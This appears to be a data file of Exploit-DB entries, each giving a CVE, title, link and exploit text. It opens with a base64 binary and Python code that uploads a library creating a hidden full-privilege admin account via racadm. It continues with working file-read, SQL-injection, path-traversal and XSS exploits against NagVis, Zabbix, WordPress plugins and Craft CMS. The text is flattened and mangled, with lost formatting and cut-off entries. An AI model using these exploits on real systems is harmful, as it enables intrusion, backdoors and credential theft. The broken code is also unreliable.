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BgBwAAYAcAADgAAAAAAAAAAAAAACAAAAAAAAAAigAAAAEAAAACAAAAmAcAAJgHAACvAAAAAAAAAAAAAAAEAAAAAAAAAJIAAAABAAAAAgAAAEgIAABICAAABAAAAAAAAAAAAAAABAAAAAAAAACcAAAADgAAAAMAAAAUDwEAFA8AAAQAAAAAAAAAAAAAAAQAAAAEAAAAqAAAAAEAAAADAAAAGA8BABgPAAAIAAAAAAAAAAAAAAAEAAAAAAAAAK8AAAABAAAAAwAAACAPAQAgDwAACAAAAAAAAAAAAAAABAAAAAAAAAC2AAAABgAAAAMAAAAoDwEAKA8AANgAAAAFAAAAAAAAAAQAAAAIAAAAvwAAAAEAAAADAAAAABABAAAQAAAEAAAAAAAAAAAAAAAEAAAAAAAAAMUAAAABAAAAAwAAAAQQAQAEEAAALAAAAAAAAAAAAAAABAAAAAQAAADKAAAACAAAAAMAAAAwEAEAMBAAAAgAAAAAAAAAAAAAAAQAAAAAAAAAzwAAAAEAAAAwAAAAAAAAADAQAAArAAAAAAAAAAAAAAABAAAAAQAAAAEAAAACAAAAAAAAAAAAAABcEAAAUAMAABkAAAAvAAAABAAAABAAAAAJAAAAAwAAAAAAAAAAAAAArBMAAIUBAAAAAAAAAAAAAAEAAAAAAAAAEQAAAAMAAAAAAAAAAAAAADEVAADYAAAAAAAAAAAAAAABAAAAAAAAAA==' #> For the source code of this pre-compiled C code, see below #Main program class CustomHTTPAdapter(requests.adapters.HTTPAdapter): def initpoolmanager(self, *args, **kwargs): context = requests.ssl.createdefaultcontext() context.setciphers('ALL:=0') context.checkhostname = False context.minimumversion = requests.ssl.TLSVersion.SSLv3 super().initpoolmanager(*args, **kwargs, sslcontext=context) def callURL(sURL, oSession, bData=None, lstProxies={}, boolVerbose=False): try: if bData: oResponse = oSession.post(sURL, data=bData, proxies=lstProxies, verify=False) #Removed timeout here, as it may take a long time to upload files else: oResponse = oSession.get(sURL, proxies=lstProxies, verify=False, timeout = iTimeout) except: oResponse = None return oResponse def checkVuln(sIP, oSession, lstProxies={}, boolVerbose=False): oResponse = callURL(f' <URL> oSession, lstProxies = lstProxies) if not oResponse is None and 'calling init: /lib/' in oResponse.text: if boolVerbose: print('[*] Data returned: ') print(oResponse.text) return True return False def uploadAndRunLibrary(bData, oSession, sIP, lstProxies, boolVerbose=False): iFFLAGS = 1 bFAlias = b'RACPKSSHAUTHKEY1' bLib = bFAlias + (32 - len(bFAlias))*b'\0' bLib += struct.pack(' include static void main(void) attribute_((constructor)); static void main(void) int pid1 = fork(); if(!pid1) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminUserName"", ""user"", (char) NULL); int pid2 = fork(); if(!pid2) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminPassword"", ""Passw0rd"", (char) NULL); int pid3 = fork(); if(!pid3) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminPrivilege"", ""0x000001ff"", (char) NULL); int pid4 = fork(); if(!pid4) { execlp(""racadm"", ""racadm"", ""config"", ""-g"", ""cfgUserAdmin"", ""-i"", ""13"", ""-o"", ""cfgUserAdminEnable"", ""1"", (char) NULL);"
CVE-2022-4407,"{""CVE-2022-4407"": 1}",2025-04-16,phpMyFAQ 3.1.7 - Reflected Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52226,Exploit Title: phpMyFAQ 3.1.7 - Reflected Cross-Site Scripting (XSS) Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 3.1.7 Tested on: Ubuntu Windows CVE : CVE-2022-4407
CVE-2024-46278,"{""CVE-2024-46278"": 1}",2025-04-16,Teedy 1.11 - Account Takeover via Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52228,Exploit Title: Teedy 1.11 - Account Takeover via Stored Cross-Site Scripting (XSS) Exploit Author: Ayato Shitomi @ Fore-Z co.ltd Demo Video: <URL> Vendor Homepage: <URL> Software Link: <URL> Version: 1.11 Tested on: Linux CVE : CVE-2024-46278 There is a vulnerability that causes XSS when downloading files. XSS vulnerability could allow a Teedy administrator to rob an account with a few clicks. Login as an attacker’s account. Upload this file as html type. You have to change “Origin” and “Referer” and argument for fetch in need. Login with another account. eg. admin Click on the file uploaded by the attacker and select Download this file.
CVE-2022-46945,"{""CVE-2022-46945"": 1}",2025-04-16,NagVis 1.9.33 - Arbitrary File Read,https://www.exploit-db.com/exploits/52229,"Exploit Title: NagVis 1.9.33 - Arbitrary File Read Date: 03/12/2024 Exploit Author: David Rodríguez a.k.a. xerosec Vendor Homepage: <URL> Software Link: <URL> Version: 1.9.33 Tested on: Linux CVE: CVE-2022-46945 import requests import argparse import json from urllib.parse import urljoin def authenticate(targeturl, username, password): url = urljoin(targeturl, '/nagvis/frontend/nagvis-js/index.php') headers = {""User-Agent"": ""Mozilla/5.0"", ""Content-Type"": ""application/x-www-form-urlencoded""} data = {""username"": username, ""password"": password, ""submit"": ""Login""} try: response = requests.post(url, headers=headers, data=data) if response.statuscode == 200 and ""Set-Cookie"" in response.headers: print(""[] Authentication successful."") return response.headers[""Set-Cookie""] print(f""[✘] Authentication failed. Status code: {response.statuscode}"") except Exception as e: print(f""[✘] Request error: {e}"") return None def exploit(targeturl, sessioncookie, filepath): url = urljoin(targeturl, '/nagvis/server/core/ajaxhandler.php') headers = {""User-Agent"": ""Mozilla/5.0"", ""Cookie"": sessioncookie} params = {""mod"": ""General"", ""act"": ""getHoverUrl"", ""url[]"": f""file://{filepath}""} try: response = requests.get(url, headers=headers, params=params) if response.statuscode == 200: print(""[] Exploitation successful. File content:\n"") displayfilecontent(response.text) else: print(f""[✘] Exploitation failed. Status code: {response.statuscode}"") except Exception as e: print(f""[✘] Request error: {e}"") def displayfilecontent(rawresponse): try: data = json.loads(rawresponse) if isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict) and ""code"" in data[0]: content = data[0][""code""] Decodificar escapes de manera segura content = content.encode('utf-8').decode('unicodeescape') print(content.strip()) else: print(""[✘] Unexpected JSON structure."") except json.JSONDecodeError as jde: print(f""[✘] JSON decoding error: {jde}"") except Exception as e: print(f""[✘] Unexpected error during output processing: {e}"") def main(): parser = argparse.ArgumentParser(description=""Exploit for CVE-2022-46945 (File Read Vulnerability)"") parser.addargument(""-t"", ""--target"", required=True, help=""Target base URL (e.g., <URL> parser.addargument(""-u"", ""--username"", required=True, help=""Username for authentication"") parser.addargument(""-p"", ""--password"", required=True, help=""Password for authentication"") parser.addargument(""-f"", ""--file"", required=True, help=""File path to read (e.g., /etc/passwd)"") args = parser.parseargs() sessioncookie = authenticate(args.target, args.username, args.password) if sessioncookie: exploit(args.target, sessioncookie, args.file) if name == ""main"": main()"
CVE-2024-42327,"{""CVE-2024-42327"": 1}",2025-04-16,Zabbix 7.0.0 - SQL Injection,https://www.exploit-db.com/exploits/52230,"Exploit Title: Zabbix 7.0.0 - SQL Injection Date: 06/12/2024 Exploit Author: Leandro Dias Barata Vendor Homepage: <URL> Software Link: <URL> Version: 6.0.0 - 6.0.31 / 6.0.32rc1 6.4.0 - 6.4.16 / 6.4.17rc1 7.0.0 Tested on: Kali Linux kali-linux-2024.3 CVE: CVE-2024-42327 import requests import argparse HEADERS = {""Content-Type"": ""application/json""} def main(): parser = argparse.ArgumentParser(description=""CHECK for CVE-2024-42327"") parser.addargument(""-t"", ""--target"", required=True, help=""API URL"") parser.addargument(""-u"", ""--username"", required=True, help=""Username"") parser.addargument(""-p"", ""--password"", required=True, help=""Password"") args = parser.parseargs() url = f""{args.target.rstrip('/')}/apijsonrpc.php"" Login to get the token logindata = { ""jsonrpc"": ""2.0"", ""method"": ""user.login"", ""params"": {""username"": args.username, ""password"": args.password}, ""id"": 1, ""auth"": None try: loginresponse = requests.post(url, json=logindata, headers=HEADERS) loginresponse.raiseforstatus() authtoken = loginresponse.json().get(""result"") Simple SQLi test data = { ""jsonrpc"": ""2.0"", ""method"": ""user.get"", ""params"": { ""selectRole"": [""roleid"", ""name"", ""type"", ""readonly AND (SELECT(SLEEP(5)""], ""userids"": [""1"", ""2""] ""id"": 1, ""auth"": authtoken testresponse = requests.post(url, json=data, headers=HEADERS) testresponse.raiseforstatus() if ""error"" in testresponse.text: print(""[-] NOT VULNERABLE."") else: print(""[!] VULNERABLE."") except requests.RequestException as e: print(f""[!] Request error: {e}"") if name == ""main_"": main()"
CVE-2024-55889,"{""CVE-2024-55889"": 1}",2025-04-16,phpMyFAQ 3.2.10 - Unintended File Download Triggered by Embedded Frames,https://www.exploit-db.com/exploits/52235,"Exploit Title: phpMyFAQ v3.2.10 - Unintended File Download Triggered by Embedded Frames Date: 13 Dec 2024 Exploit Author: George Chen Vendor Homepage: <URL> Software Link: <URL> Version: v3.2.10 Tested on: Mac, Win CVE : CVE-2024–55889 Summary A vulnerability exists in the FAQ Record component of <URL> v3.2.10 where a privileged attacker can trigger a file download on a victim’s machine upon page visit by embedding it in an"
CVE-2018-16606,"{""CVE-2018-16606"": 1}",2025-04-16,ProConf 6.0 -  Insecure Direct Object Reference (IDOR),https://www.exploit-db.com/exploits/52236,"Exploit Title: ProConf 6.0 - Insecure Direct Object Reference (IDOR) Date: 19/07/2018 Exploit Author: S. M. Zia Ur Rashid, SC Author Contact: <URL> Vendor Homepage: <URL> & <URL> Version: <= 6.0 Tested on: Windows CVE : CVE-2018-16606 Patched Version: 6.1 Description: In ProConf before 6.1, an Insecure Direct Object Reference (IDOR) allows any author to view and grab all submitted papers (Title and Abstract) and their authors' personal information (Name, Email, Organization, and Position) by changing the value of Paper ID (the pid parameter). PROOF-OF-CONCEPT Step 1: Sign In as an author for a conference & submit a paper. Youall get a paper ID. Step 2: Now go to paper details and change the value of Paper ID (param pid=xxxx) to nearest previous value to view others submitted paper & authors information. <URL>"
CVE-2022-41358,"{""CVE-2022-41358"": 1}",2025-04-16,Garage Management System 1.0 (categoriesName) - Stored XSS,https://www.exploit-db.com/exploits/52238,"Exploit Title: Garage Management System 1.0 (categoriesName) - Stored XSS Date: 18-09-2022 Exploit Author: Sam Wallace, SC Software Link: <URL> Version: 1.0 Tested on: Debian CVE : CVE-2022-41358 Summary: Garage Management System utilizes client side validation to prevent XSS. Using burp, a request can be modified and replayed to the server bypassing this validation which creates an avenue for XSS. Parameter: categoriesName URI: /garage/php_action/createCategories.php"
CVE-2022-37061,"{""CVE-2022-37061"": 1}",2025-04-16,FLIR AX8 1.46.16  - Remote Command Injection,https://www.exploit-db.com/exploits/52240,Exploit Title: FLIR AX8 1.46.16 - Remote Command Injection Date: 8/19/2022 Exploit Author: Samy Younsi Naqwada ( <URL> SC Vendor Homepage: <URL> Software Link: <URL>
CVE-2022-23409,"{""CVE-2022-23409"": 1}",2025-04-16,Ethercreative Logs 3.0.3 - Path Traversal,https://www.exploit-db.com/exploits/52241,"Exploit Title: Ethercreative Logs 3.0.3 - Path Traversal Date: 2022.01.26 Exploit Author: Steffen Rogge, SC Vendor Homepage: <URL> Software Link: <URL> Version: <=3.0.3 Tested on: Linux CVE : CVE-2022-23409 product: Ethercreative Logs plugin for Craft CMS fixed version: >=3.0.4 impact: Medium found: 2021-07-06 SEC Consult Vulnerability Lab An integrated part of SEC Consult, an Atos company Europe | Asia | North America <URL> Vendor description: ""A quick and dirty way to access your logs from inside the CP"" As found on the plugin store page: <URL> Active Installs 4,093 (as of 2021-07-07) Business recommendation: The vendor provides a patched version v3.0.4 which should be installed immediately. Vulnerability overview/description: 1) Authenticated Path Traversal (CVE-2022-23409) The plugin ""Logs"" provides a functionality to read log files of the Craft CMS system inside the backend of the CMS. As the requested logfile is not properly validated, an attacker is able to request arbitrary files from the underlying file system with the permissions of the web service user. Proof of concept: 1) Authenticated Path Traversal (CVE-2022-23409) As the plugin is installed as an administrator of the system and the function is only accessible after being logged in as an admin, an attacker needs to be authenticated as an administrator in the backend in order to extract the needed ""{MD5}identity"" cookie for the crafted request. The vulnerable endpoint is provided by the plugin under the following path: <URL> The vulnerable controller for that endpoint can be found here: <URL> The function ""actionStream()"" provides an endpoint for the Craft CMS and does not validate input values before file content is being read by the function ""filegetcontents"". public function actionStream () $logsDir = \Craft::getAlias('/logs'); $logFile = \Craft::$app->request->getParam('log'); $currentLog = \Craft::$app->request->get('log', $logFile); $log = filegetcontents($logsDir . '/' . $currentLog); exit($log); A crafted GET parameter with the name ""log"" can be used to access files on the underlying filesystem with rights as the user executing the web server. In most cases this will be the user ""www-data"". In order to read the file "".env"" or "".env.php"" which contains the environment configuration and as such also the database credentials, the following request can be used: GET /admin/actions/logs/logs/stream?log=../../.env HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:89.0) Gecko/20100101 Firefox/89.0 Connection: close Cookie: 1031b8c41dfff97a311a7ac99863bdc5identity= ; The response then discloses the file content of the file "".env"": HTTP/1.1 200 OK Date: Thu, 07 Jul 2021 10:08:52 GMT Server: nginx Content-Type: text/html; charset=UTF-8 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Set-Cookie: CraftSessionId=2uisculfj8t9q1tnbiukl6ogjf; path=/; secure; HttpOnly Content-Length: 1600 Connection: close $craftEnvVars = [ 'DBDRIVER' => 'mysql', 'DBSERVER' => '*', 'DBUSER' => '', 'DBPASSWORD' => '*', 'DBDATABASE' => '', 'DBSCHEMA' => 'public', 'DBTABLEPREFIX' => '', 'DBPORT' => '', 'SECURITYKEY' => '*', Vulnerable / tested versions: The following version has been tested which was the latest version available at the time of the test: * Version 3.0.3 released on November 25, 2019 Distributed through the Craft Plugin Store <URL> Vendor contact timeline: 2021-07-07: Contacting vendor through dev.co.uk 2021-07-08: Response from vendor, no encryption available but vendor accepted to be responsible for any risks involved with plaintext communication 2021-07-08: Advisory was sent to vendor unencrypted 2021-07-09: Vendor released a patch for this vulnerability with version 3.0.4 ( <URL> 2021-07-12: Updated Plugin has been tested on an up-to-date CraftCMS installation (CraftCMS 3.7.0, PHP 8, MySQL 8, Logs Plugin 3.0.4) 2022-01-24: Release of security advisory Solution: The vendor released a patched version 3.0.4 or higher which can be retrieved from their website/github: <URL> <URL> Workaround: Uninstall/Disable the plugin and access the Craft CMS logs via SSH or other services. Advisory URL: <URL> SEC Consult Vulnerability Lab SEC Consult, an Atos company Europe | Asia | North America About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an Atos company. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies. Interested to work with the experts of SEC Consult? Send us your application <URL> Interested in improving your cyber security with the experts of SEC Consult? Contact our local offices <URL> Mail: research at sec-consult dot com Web: <URL> Blog: <URL> Twitter: <URL> EOF Steffen Rogge /"
CVE-2020-5509,"{""CVE-2020-5509"": 1}",2025-04-16,Car Rental Project 1.0 - Remote Code Execution,https://www.exploit-db.com/exploits/52243,"Exploit Title: Car Rental Project 1.0 - Remote Code Execution Date: 1/3/2020 Exploit Author: FULLSHADE, SC Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows CVE : CVE-2020-5509 Information & description Car Rental Project v.1.0 is vulnerable to arbitrary file upload since an admin can change the image of a product and the file change PHP code doesn't validate or care what type of file is submitted, which leads to an attack having the ability to upload malicious files. This Python"
CVE-2024-0566,"{""CVE-2024-0566"": 1}",2025-04-16,Smart Manager 8.27.0 - Post-Authenticated SQL Injection,https://www.exploit-db.com/exploits/52247,"Exploit Title: Smart Manager 8.27.0 - Post-Authenticated SQL Injection Date: 2024-01-18 Exploit Author: Ivan Spiridonov - xbz0n Vendor Homepage: <URL> Software Link: <URL> Version: 8.27.0 Tested on: Ubuntu 22.04 CVE: CVE-2024-0566 #SQL Injection The plugin does not properly sanitize and escape a parameter before using it in an SQL statement, leading to an SQL injection exploitable by high-privilege users such as admin. #Affected Components - Plugin: Smart Manager - Version: 8.27.0 - Affected Parameters: 'sortparams%5BsortOrder%5D', 'sortparams%5Bcolumn%5D' - Affected Endpoint: /wp-admin/admin-ajax.php #Description The vulnerability is located within the admin AJAX endpoint in the sorting parameters 'sortparams%5BsortOrder%5D' and 'sortparams%5Bcolumn%5D'. By manipulating these parameters, authenticated attackers can inject SQL commands, leading to a time-based SQL Injection vulnerability. #Proof of Concept Manual Exploitation `http POST /wp-admin/admin-ajax.php?action=smbetaincludefile HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/plain, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 1117 Origin: <URL> Connection: close Cookie: Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin cmd=getdatamodel&activemodule=product&security=37e8d818b7&ispublic=1&smpage=1&smlimit=50&SMISWOO30=true&sortparams%5Bcolumn%5D=postmeta%2Fmetakey%3Dtaxstatus%2Fmetavalue%3Dtaxstatus&sortparams%5BsortOrder%5D=asc%2c(select*from(select(sleep(20)a)&tablemodel%5Bposts%5D%5Bpkey%5D=ID&tablemodel%5Bposts%5D%5Bjoinon%5D=&tablemodel%5Bposts%5D%5Bwhere%5D%5Bposttype%5D%5B%5D=product&tablemodel%5Bposts%5D%5Bwhere%5D%5Bposttype%5D%5B%5D=productvariation&tablemodel%5Bposts%5D%5Bwhere%5D%5Bpoststatus%5D=any&tablemodel%5Bpostmeta%5D%5Bpkey%5D=postid&tablemodel%5Bpostmeta%5D%5Bjoinon%5D=postmeta.postID+%3D+posts.ID&tablemodel%5Btermrelationships%5D%5Bpkey%5D=objectid&tablemodel%5Btermrelationships%5D%5Bjoinon%5D=termrelationships.objectid+%3D+posts.ID&tablemodel%5Btermtaxonomy%5D%5Bpkey%5D=termtaxonomyid&tablemodel%5Btermtaxonomy%5D%5Bjoinon%5D=termtaxonomy.termtaxonomyid+%3D+termrelationships.termtaxonomyid&tablemodel%5Bterms%5D%5Bpkey%5D=termid&tablemodel%5Bterms%5D%5Bjoinon%5D=terms.termid+%3D+termtaxonomy.termid&searchtext=&advancedsearchquery=%5B%5D&isview=0&isTasks=0&is_taxonomy=0 If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability. #Recommendations Users of Smart Manager v8.27.0 are strongly advised to restrict access to the affected endpoint and update the plugin to the latest version."
CVE-2024-0399,"{""CVE-2024-0399"": 1}",2025-04-16,WooCommerce Customers Manager 29.4 - Post-Authenticated SQL Injection,https://www.exploit-db.com/exploits/52248,"Exploit Title: WooCommerce Customers Manager 29.4 - Post-Authenticated SQL Injection Date: 2024-03-25 Exploit Author: Ivan Spiridonov - xbz0n Software Link: <URL> Version: 29.4 Tested on: Ubuntu 22.04 CVE: CVE-2024-0399 #SQL Injection The plugin does not properly sanitise and escape a parameter before using it in a SQL statement, leading to an SQL injection exploitable by Subscriber+ role. #Affected Components - Plugin: WooCommerce Customers Manager - Version: 29.4 - Affected Parameters: 'maxamount', 'maxamounttotal', 'minamount', 'minamounttotal' - Affected Endpoint: /wp-admin/admin-ajax.php #Description The vulnerability is located within the transaction amount parameters like 'maxamount', 'maxamounttotal', 'minamount', and 'minamounttotal' used in the admin AJAX endpoint. By injecting SQL commands into these parameters, authenticated attackers can manipulate SQL queries leading to a time-based SQL Injection vulnerability. #Proof of Concept Manual Exploitation `http POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=-2461714219322283440478088295 Content-Length: 1877 Origin: <URL> Connection: close Cookie: Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -2461714219322283440478088295 Content-Disposition: form-data; name=""action"" wccmgetorderstotnum -2461714219322283440478088295 Content-Disposition: form-data; name=""startdate"" 2024-01-09 -2461714219322283440478088295 Content-Disposition: form-data; name=""enddate"" 2024-01-11 -2461714219322283440478088295 Content-Disposition: form-data; name=""customerids"" -2461714219322283440478088295 Content-Disposition: form-data; name=""productids"" -2461714219322283440478088295 Content-Disposition: form-data; name=""categoryids"" -2461714219322283440478088295 Content-Disposition: form-data; name=""minamount"" 0 -2461714219322283440478088295 Content-Disposition: form-data; name=""maxamount"" 0 -2461714219322283440478088295 Content-Disposition: form-data; name=""minamounttotal"" 0 -2461714219322283440478088295 Content-Disposition: form-data; name=""maxamounttotal"" (select*from(select(sleep(20)a) -2461714219322283440478088295 Content-Disposition: form-data; name=""productrelationship"" or -2461714219322283440478088295 Content-Disposition: form-data; name=""productcategoryrelationship"" or -2461714219322283440478088295 Content-Disposition: form-data; name=""productcategoryfilters_relationship"" and -2461714219322283440478088295 Content-Disposition: form-data; name=""statuses"" wc-pending,wc-processing,wc-on-hold,wc-completed,wc-cancelled,wc-refunded,wc-failed,wc-checkout-draft -2461714219322283440478088295-- If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability. #Recommendations Users of WooCommerce Customers Manager v29.4 are strongly advised to restrict access to the affected endpoint and update the plugin as soon as a fixed version is released. This advisory serves as a notice to all users of Smart Manager v8.27.0 to take immediate action in updating their plugin to protect against this SQL Injection vulnerability."
CVE-2024-48846,"{""CVE-2024-48846"": 1}",2025-04-16,ABB Cylon Aspect 3.08.02 - Cross-Site Request Forgery (CSRF),https://www.exploit-db.com/exploits/52231,P R O J E C T
